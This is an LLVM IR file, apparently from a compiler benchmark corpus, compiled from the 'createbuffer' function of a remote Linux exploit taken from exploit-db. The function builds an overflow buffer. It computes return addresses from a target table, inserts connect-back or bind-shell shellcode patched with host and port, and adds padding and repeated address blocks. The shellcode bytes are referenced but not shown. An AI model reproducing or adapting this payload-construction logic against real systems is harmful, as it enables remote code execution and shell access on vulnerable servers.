; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_107.c_createbuffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_107.c_createbuffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }

@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [49 x i8] c"[-] Sorry, the ret addr %p=%p-4 have '\\n' char.\0A\00", align 1
@bindmethod = common dso_local global i64 0, align 8
@cbshellcode = common dso_local global i8* null, align 8
@pt = common dso_local global i32 0, align 4
@bindshellcode = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @createbuffer(i8* %0, i32 %1, i32 %2, i8* %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [41 x i8], align 16
  %13 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i8* %3, i8** %8, align 8
  %14 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sub nsw i32 %15, 1
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %14, i64 %17
  %19 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %18, i32 0, i32 0
  %20 = load i32, i32* %19, align 4
  store i32 %20, i32* %13, align 4
  %21 = load i32, i32* %13, align 4
  %22 = sub i32 %21, 4
  store i32 %22, i32* %13, align 4
  %23 = bitcast i32* %13 to i8*
  %24 = call i64 @checklf(i8* %23, i32 4)
  %25 = icmp slt i64 %24, 0
  br i1 %25, label %26, label %32

26:                                               ; preds = %4
  %27 = load i32, i32* %13, align 4
  %28 = load i32, i32* %13, align 4
  %29 = add i32 %28, 4
  %30 = call i32 @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0), i32 %27, i32 %29)
  %31 = call i32 (...) @quit()
  br label %32

32:                                               ; preds = %26, %4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %33 = load i8*, i8** %5, align 8
  %34 = load i32, i32* %6, align 4
  %35 = call i32 @memset(i8* %33, i8 signext 0, i32 %34)
  %36 = load i32, i32* %9, align 4
  %37 = add nsw i32 %36, 3
  store i32 %37, i32* %9, align 4
  %38 = load i32, i32* %13, align 4
  %39 = add i32 %38, 28
  %40 = load i8*, i8** %5, align 8
  %41 = load i32, i32* %9, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = bitcast i8* %43 to i32*
  store i32 %39, i32* %44, align 4
  %45 = load i32, i32* %9, align 4
  %46 = add nsw i32 %45, 4
  store i32 %46, i32* %9, align 4
  %47 = load i32, i32* %13, align 4
  %48 = sub i32 %47, 1536
  %49 = load i8*, i8** %5, align 8
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = bitcast i8* %52 to i32*
  store i32 %48, i32* %53, align 4
  %54 = load i32, i32* %9, align 4
  %55 = add nsw i32 %54, 4
  store i32 %55, i32* %9, align 4
  %56 = load i32, i32* %13, align 4
  %57 = sub i32 %56, 1024
  %58 = load i8*, i8** %5, align 8
  %59 = load i32, i32* %9, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = bitcast i8* %61 to i32*
  store i32 %57, i32* %62, align 4
  %63 = load i32, i32* %9, align 4
  %64 = add nsw i32 %63, 4
  store i32 %64, i32* %9, align 4
  %65 = load i32, i32* %13, align 4
  %66 = sub i32 %65, 512
  %67 = load i8*, i8** %5, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = bitcast i8* %70 to i32*
  store i32 %66, i32* %71, align 4
  %72 = load i32, i32* %9, align 4
  %73 = add nsw i32 %72, 4
  store i32 %73, i32* %9, align 4
  %74 = load i32, i32* %13, align 4
  %75 = sub i32 %74, 768
  %76 = load i8*, i8** %5, align 8
  %77 = load i32, i32* %9, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = bitcast i8* %79 to i32*
  store i32 %75, i32* %80, align 4
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 4
  store i32 %82, i32* %9, align 4
  %83 = load i8*, i8** %5, align 8
  %84 = load i32, i32* %9, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = bitcast i8* %86 to i32*
  store i32 0, i32* %87, align 4
  %88 = load i32, i32* %9, align 4
  %89 = add nsw i32 %88, 4
  store i32 %89, i32* %9, align 4
  %90 = load i8*, i8** %5, align 8
  %91 = load i32, i32* %9, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = bitcast i8* %93 to i32*
  store i32 -1869607189, i32* %94, align 4
  %95 = load i32, i32* %9, align 4
  %96 = add nsw i32 %95, 4
  store i32 %96, i32* %9, align 4
  %97 = load i8*, i8** %5, align 8
  %98 = load i32, i32* %9, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %97, i64 %99
  %101 = bitcast i8* %100 to i32*
  store i32 0, i32* %101, align 4
  %102 = load i32, i32* %9, align 4
  %103 = add nsw i32 %102, 4
  store i32 %103, i32* %9, align 4
  %104 = load i8*, i8** %5, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = bitcast i8* %107 to i32*
  store i32 0, i32* %108, align 4
  %109 = load i32, i32* %9, align 4
  %110 = add nsw i32 %109, 4
  store i32 %110, i32* %9, align 4
  %111 = load i8*, i8** %5, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = bitcast i8* %114 to i32*
  store i32 0, i32* %115, align 4
  %116 = load i32, i32* %9, align 4
  %117 = add nsw i32 %116, 4
  store i32 %117, i32* %9, align 4
  %118 = load i64, i64* @bindmethod, align 8
  %119 = icmp eq i64 %118, 0
  br i1 %119, label %120, label %137

120:                                              ; preds = %32
  %121 = load i8*, i8** @cbshellcode, align 8
  %122 = load i8*, i8** %8, align 8
  %123 = load i32, i32* @pt, align 4
  %124 = call i32 @modify(i8* %121, i8* %122, i32 %123)
  %125 = load i8*, i8** %5, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  %129 = load i8*, i8** @cbshellcode, align 8
  %130 = load i8*, i8** @cbshellcode, align 8
  %131 = call i32 @strlen(i8* %130)
  %132 = call i32 @memcpy(i8* %128, i8* %129, i32 %131)
  %133 = load i8*, i8** @cbshellcode, align 8
  %134 = call i32 @strlen(i8* %133)
  %135 = load i32, i32* %9, align 4
  %136 = add nsw i32 %135, %134
  store i32 %136, i32* %9, align 4
  br label %153

137:                                              ; preds = %32
  %138 = load i8*, i8** @bindshellcode, align 8
  %139 = load i32, i32* @pt, align 4
  %140 = call i32 @modify(i8* %138, i8* null, i32 %139)
  %141 = load i8*, i8** %5, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8, i8* %141, i64 %143
  %145 = load i8*, i8** @bindshellcode, align 8
  %146 = load i8*, i8** @bindshellcode, align 8
  %147 = call i32 @strlen(i8* %146)
  %148 = call i32 @memcpy(i8* %144, i8* %145, i32 %147)
  %149 = load i8*, i8** @bindshellcode, align 8
  %150 = call i32 @strlen(i8* %149)
  %151 = load i32, i32* %9, align 4
  %152 = add nsw i32 %151, %150
  store i32 %152, i32* %9, align 4
  br label %153

153:                                              ; preds = %137, %120
  %154 = load i8*, i8** %5, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8, i8* %154, i64 %156
  %158 = load i32, i32* %9, align 4
  %159 = sub nsw i32 512, %158
  %160 = call i32 @memset(i8* %157, i8 signext 90, i32 %159)
  %161 = load i8*, i8** %5, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 512
  %163 = call i32 @memset(i8* %162, i8 signext 10, i32 512)
  store i32 1024, i32* %11, align 4
  %164 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %165 = call i32 @memset(i8* %164, i8 signext 0, i32 41)
  store i32 0, i32* %9, align 4
  %166 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %167 = call i32 @memset(i8* %166, i8 signext 10, i32 20)
  %168 = load i32, i32* %9, align 4
  %169 = add nsw i32 %168, 20
  store i32 %169, i32* %9, align 4
  %170 = load i32, i32* %13, align 4
  %171 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %172 = load i32, i32* %9, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8, i8* %171, i64 %173
  %175 = bitcast i8* %174 to i32*
  store i32 %170, i32* %175, align 4
  %176 = load i32, i32* %9, align 4
  %177 = add nsw i32 %176, 4
  store i32 %177, i32* %9, align 4
  %178 = load i32, i32* %13, align 4
  %179 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8, i8* %179, i64 %181
  %183 = bitcast i8* %182 to i32*
  store i32 %178, i32* %183, align 4
  %184 = load i32, i32* %9, align 4
  %185 = add nsw i32 %184, 4
  store i32 %185, i32* %9, align 4
  %186 = load i32, i32* %13, align 4
  %187 = add i32 %186, 2048
  %188 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8, i8* %188, i64 %190
  %192 = bitcast i8* %191 to i32*
  store i32 %187, i32* %192, align 4
  %193 = load i32, i32* %9, align 4
  %194 = add nsw i32 %193, 4
  store i32 %194, i32* %9, align 4
  %195 = load i32, i32* %13, align 4
  %196 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds i8, i8* %196, i64 %198
  %200 = bitcast i8* %199 to i32*
  store i32 %195, i32* %200, align 4
  %201 = load i32, i32* %9, align 4
  %202 = add nsw i32 %201, 4
  store i32 %202, i32* %9, align 4
  %203 = load i32, i32* %13, align 4
  %204 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i8, i8* %204, i64 %206
  %208 = bitcast i8* %207 to i32*
  store i32 %203, i32* %208, align 4
  store i32 0, i32* %9, align 4
  br label %209

209:                                              ; preds = %224, %153
  %210 = load i32, i32* %9, align 4
  %211 = icmp slt i32 %210, 1024
  br i1 %211, label %212, label %227

212:                                              ; preds = %209
  %213 = load i32, i32* %9, align 4
  %214 = mul nsw i32 %213, 40
  %215 = add nsw i32 %214, 1024
  store i32 %215, i32* %10, align 4
  %216 = load i8*, i8** %5, align 8
  %217 = load i32, i32* %10, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i8, i8* %216, i64 %218
  %220 = getelementptr inbounds [41 x i8], [41 x i8]* %12, i64 0, i64 0
  %221 = call i32 @memcpy(i8* %219, i8* %220, i32 40)
  %222 = load i32, i32* %11, align 4
  %223 = add nsw i32 %222, 40
  store i32 %223, i32* %11, align 4
  br label %224

224:                                              ; preds = %212
  %225 = load i32, i32* %9, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %9, align 4
  br label %209

227:                                              ; preds = %209
  %228 = load i32, i32* %11, align 4
  ret i32 %228
}

declare dso_local i64 @checklf(i8*, i32) #1

declare dso_local i32 @printf(i8*, i32, i32) #1

declare dso_local i32 @quit(...) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @modify(i8*, i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
